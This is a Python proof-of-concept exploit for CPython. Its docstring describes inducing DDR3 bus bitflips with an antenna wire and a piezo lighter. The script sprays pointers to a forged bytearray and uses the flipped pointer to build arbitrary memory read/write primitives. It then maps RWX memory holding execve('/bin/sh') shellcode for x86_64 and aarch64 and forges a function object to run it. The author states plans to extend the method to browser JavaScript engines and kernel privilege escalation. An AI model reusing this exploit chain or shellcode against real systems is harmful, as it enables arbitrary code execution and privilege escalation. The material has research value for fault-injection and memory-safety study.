"""
Hardware setup:

Laptop with a single 1GB DDR3 SODIMM, with a ~10CM "antenna" wire soldered to the DQ7 line

(I'm not sure if it matters but I also have a 15 ohm resistor at the point where the antenna connects)

When I click the button on a regular piezo-electric cigarette lighter, a small EMP
is generated, which is picked up by the antenna. Running memtest shows several
bitflips occur each time (depending on the distance) and the flip *always* affects
bit 7 of each 64-bit word.

The idea:

I'm "exploiting" cpython first as a PoC because I'm familiar with cpython's inner workings.
Obviously it's a bit pointless because you can just os.system("/bin/sh"), but this script
should demonstrate practical exploitation of physically induced memory corruptions.

Once I have this working, I'm going to look into exploiting browser JS engines, and also kernel LPEs.

We can use similar strategies to rowhammer exploits, but rather than the bitflips
occuring in memory contents "at rest", theu're occuring "in flight" over the bus.
"""

TESTING = False

def p64(n: int) -> bytes:
	return n.to_bytes(8, "little")

def u64(n: bytes) -> int:
	return int.from_bytes(n, "little")

def prepare_bytes(writer: bytearray, padding: int) -> bytes:
	# correct layout as of python3.12
	fake_bytearray = b""
	fake_bytearray += p64(1) # refcount
	fake_bytearray += p64(id(bytearray)) # type
	fake_bytearray += p64(1024) # length?
	fake_bytearray += p64(1024+1) # length2?
	fake_bytearray += p64(id(writer)) # ptr?
	fake_bytearray += p64(id(writer)) # ptr2?
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????
	fake_bytearray += p64(0) # ????

	# Set up a bytes object that contains a bytearray object within it, at offset 0x80.
	victim = b"A"*(0x80 - 32) + fake_bytearray + b"A"*padding # bytes objects have 32 bytes of header (on 64-bit systems), immediately followed by their value

	return victim

if __name__ == "__main__":
	import platform
	import mmap
	from types import FunctionType

	if TESTING:
		print("TESTING mode is enabled - simulating bitflips with software")
		from simulate_ddr3_dq7_fault import simulate_emfi

	writer = bytearray(8) # we'll later turn this into an arbread/arbwrite primitive

	for i in range(0, 0x10000, 0x80):
		victim = prepare_bytes(writer, i)
		victim_addr = id(victim)
		if victim_addr & 0x80 == 0: # this ensures that when bit 7 flips, it has the effect of adding 128 to the address
			break
		# keep trying until that constraint is met
	else:
		raise Exception("failed to align victim object")

	print("victim object @", hex(victim_addr))

	print("Spraying...")
	magic = None
	while not magic:
		spray = (victim,) * 0x100_0000 # spray 128MiB worth of pointers (needs to be big enough to exceed L3 cache)

		if TESTING:
			simulate_emfi() # in practice this corrupts data "at rest", but imagine we're corrupting either the writes (during the spray) or the reads (in the loop that follows)

		# NB: if I can improve the performance of this loop, it'll improve the reliability of the exploit
		# (the more memory bandwidth we use, the more likely a random fault is going to affect *our* activity,
		# vs some other process on the system etc.)
		for obj in (obj for obj in spray if obj is not victim):
			print("Found corrupted ptr!")
			assert(type(obj) is bytearray)
			magic = obj
			break
		print(".", end="", flush=True) # progress kinda

	print("\nSpray success! Corrupted victim object @", hex(id(magic)))

	def read64(addr: int) -> bytes:
		magic[8*4:8*5] = p64(addr)
		magic[8*5:8*6] = p64(addr)
		#return int.from_bytes(writer, "little")
		return bytes(writer)
	
	def write64(addr: int, value) -> None:
		if type(value) is int:
			value = p64(value)
		magic[8*4:8*5] = p64(addr)
		magic[8*5:8*6] = p64(addr)
		writer[:8] = value

	# testing out the read/write primitives
	hello = b"hello"
	print(read64(id(hello)+32)) # sanity check

	# use arbwrite to modify the "hello" variable
	write64(id(hello)+32, b"xxxxx\0\0\0")

	# print the modified version
	print(hello)

	print("looks like the read/write primitive works, now to spawn a shell...")

	# very cheatily map some rwx shellcode using the standard library

	shellcodes = {}
	# http://shell-storm.org/shellcode/files/shellcode-806.php
	shellcodes["x86_64"] = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
	# https://www.exploit-db.com/exploits/47048
	shellcodes["aarch64"] = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"

	shellcode = shellcodes[platform.machine()]

	mm = mmap.mmap(-1, len(shellcode), flags=mmap.MAP_SHARED|mmap.MAP_ANONYMOUS, prot=mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC)
	mm.write(shellcode)

	shellcode_addr = u64(read64(id(mm)+16))
	print("shellcode @", hex(shellcode_addr))


	# start crafting a function object
	ft_addr = id(FunctionType)
	my_functype = bytearray()
	for i in range(0, 0x200, 8):
		my_functype += read64(ft_addr + i)
	
	my_functype[16*8:16*8 + 8] = p64(shellcode_addr)

	# clear Py_TPFLAGS_HAVE_VECTORCALL in tp_flags
	tp_flags = u64(my_functype[21*8 : 21*8 + 8])
	tp_flags &= ~(1<<11) # Py_TPFLAGS_HAVE_VECTORCALL
	my_functype[21*8 : 21*8 + 8] = p64(tp_flags)

	my_functype = bytes(my_functype)
	my_functype_addr = id(my_functype) + 32

	my_func_instance = p64(1) + p64(my_functype_addr)
	my_func_instance_addr = id(my_func_instance) + 32

	# "fakeobj" primitive
	func_container = (0,)
	write64(id(func_container) + 24, p64(my_func_instance_addr))
	
	myfunc = func_container[0]
	myfunc()
